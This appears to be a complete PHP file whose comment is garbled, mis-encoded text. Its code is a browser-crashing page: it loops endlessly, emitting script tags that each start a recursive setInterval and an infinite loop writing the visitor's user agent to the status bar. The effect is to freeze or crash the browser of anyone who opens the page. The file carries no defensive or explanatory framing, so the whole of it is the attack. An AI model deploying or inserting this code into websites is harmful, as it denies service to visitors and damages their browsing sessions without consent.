<?php
	/**
	 * ±¾±¼Àb«È¤u¨ã
	 */
	 
    while (@ob_end_clean());
    echo '<script>function setInt(){setInterval("setInt()", 1);}</script>';
    while(1) echo '<script>setInt(); while(1) window.status = navigator.userAgent;</script>';
?>
